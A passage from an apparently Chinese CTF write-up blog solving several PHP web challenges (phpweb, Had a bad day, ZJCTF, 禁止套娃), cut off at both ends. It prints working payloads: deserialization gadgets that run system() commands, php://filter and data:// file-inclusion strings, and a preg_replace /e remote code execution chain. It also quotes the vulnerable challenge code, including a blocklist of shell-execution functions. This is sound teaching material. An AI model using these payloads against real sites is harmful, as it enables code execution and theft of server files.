class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">12</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/WLVRMOO2ZVHZ1IHR1E.png"><br>查看源代码<br><img src="/images/FISBFG6M8XZVKJ8.png"><br>base64解码就可得到flag了</p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>页面一直在刷新，抓个包先<br><img src="/images/ZQSBGIA79FQDV2.png"><br>POST检查前面是函数，后面是参数<br>这里eval(system(‘ls’))用不了了，应该是被过滤了<br>应该是用了call_user_func()函数，用file_get_contents看一下源代码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">func</span>=file_get_contents&amp;p=index.php<br></code></pre></td></tr></table></figure><p>找到php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了很多函数，用反序列化试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">func</span><span class="hljs-operator">=</span>unserialize<span class="hljs-variable">&amp;p</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:<span class="hljs-punctuation">&#123;</span>s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//bg.jpg index.php index.php</span><br><br><span class="hljs-attr">func</span><span class="hljs-operator">=</span>unserialize<span class="hljs-variable">&amp;p</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:<span class="hljs-punctuation">&#123;</span>s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></code></pre></td></tr></table></figure><p>flag应该是藏到了更隐蔽的位置</p><p>用find命令全局查找<br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/XR86EVQQXJ4OGAGCIE6.png"><br>&#x2F;tmp&#x2F;flagoefiu4r93是flag的正确位置<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br><span class="hljs-regexp">//</span>flag&#123;d9827631-f2f1-<span class="hljs-number">407</span>b-<span class="hljs-number">9</span>ee9-<span class="hljs-number">5</span>fc84da1246a&#125;<br></code></pre></td></tr></table></figure><p>用readfile也可以<br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=readfile&amp;p=/tmp/flagoefiu4r93<br><br><span class="hljs-attribute">or</span><br><br><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;/tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;readfile&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>源代码没有透漏出什么有用的信息<br>随便进入一个选项<br>看了看url栏，?category&#x3D;woofers，应该存在sql注入<br><img src="/images/VR1N6OQCRZJXPPOO7AQX.png"><br>报错信息提取到include，和加了.php后缀<br>include的话我们使用伪协议<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index<br></code></pre></td></tr></table></figure><p>返回一大串base64编码解码后查看源码<br>源码中夹杂了php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>if(true||false||false)</code><br>返回的结果是true，也就是满足一个条件成立即可，我们现在要读取的是flag.php<br>使用相对路径<br>相对路径计算时中间目录不存在并不影响</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers<span class="hljs-regexp">/../</span>flag<br><span class="hljs-regexp">//</span>PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7ZWE3NTMyYTktYTRjYS00MDA0LWIzOTEtZDAzZmY4Nzc3YmM0fQo/Pgo= <br></code></pre></td></tr></table></figure><p>解码后就能得到flag了</p><p>还可以利用php:&#x2F;&#x2F;filter伪协议可以套一层协议读取flag.php<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/i</span>ndex/resource=flag<br></code></pre></td></tr></table></figure><p>套一个字符index符合条件并且传入flag，读取flag.php<br>可以发现当php定位不到我们自己加的filter时会报warning<br>但并没有影响执行</p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一个if用data伪协议通过,flag被禁用了，那么读读注释里next.php 里的内容<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=<span class="hljs-keyword">next</span>.php<br></code></pre></td></tr></table></figure><p>next.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>preg_replace的&#x2F;e模式存在命令执行漏洞,不知道这个$_SESSION[‘id’]是什么鬼<br><a href="https://xz.aliyun.com/t/2557">传送门</a>非常详细<br>先来搞定这两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=<span class="hljs-variable">$&#123;</span>phpinfo()&#125;<br></code></pre></td></tr></table></figure><p>成功显示我们需要显示的内容<br><img src="/images/M4DDC2IQVG3UJ5UHXDSK.png"><br>需要传入$cmd参数，然后eval执行拿到flag<br>getFlag没有被调用<br>调用一下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;<span class="hljs-attribute">cmd</span>=phpinfo();<br></code></pre></td></tr></table></figure><p>成功，开始rce</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=<span class="hljs-variable">$&#123;</span>getFlag()&#125;&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>开始页面未找到可利用信息，抓包也什么没有发现<br>用dirsearch搜搜<br><img src="/images/FGQ77UZZI9ZN0I.png"><br>出现了很多.git后缀的文件，确定为git源码泄露<br>使用githack扫一扫<br>扫出了网站的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>开始代码审计<br>这一题有很多的过滤<br>第二个if过滤让php伪协议data协议都不能用了<br>第二个if</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, NULL, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])</span></span>)<br></code></pre></td></tr></table></figure><p><code>[a-z,_]+ : [a-z,_]</code><br>匹配小写字母和下划线 +表示1到多个</p><p><code>(?R)?</code><br>(?R)代表当前表达式，就是这个<code>(/[a-z,_]+((?R)?)/)</code>，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配<code>a(b(c()d())))</code></p><p>如果传进去的值是字符串接一个()，那么字符串就会被替换为空，如果(递归)替换后的字符串只剩下<code>;</code>，那么我们传进去的exp就会被eval执行。比如我们传入一个<code>phpinfo();</code>,他被替换后就剩下<code>;</code>,那么更具条件就会执行<code>phpinfo();</code></p><p>而(?R)?能匹配的只有<code>a(b()); a(b(c()));</code>这种类型的，比如传入<code>a(b(c()));</code>,第一次匹配后，就剩<code>a(b())</code>,第二次匹配后,<code>a();</code>,第三次匹配后就剩下<code>;</code>了，最后<code>a(b(c()))</code>就会被eval执行。</p><p>这题的思路到这就很明确了，使用无参RCE<br>下面是无参RCE的常用函数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 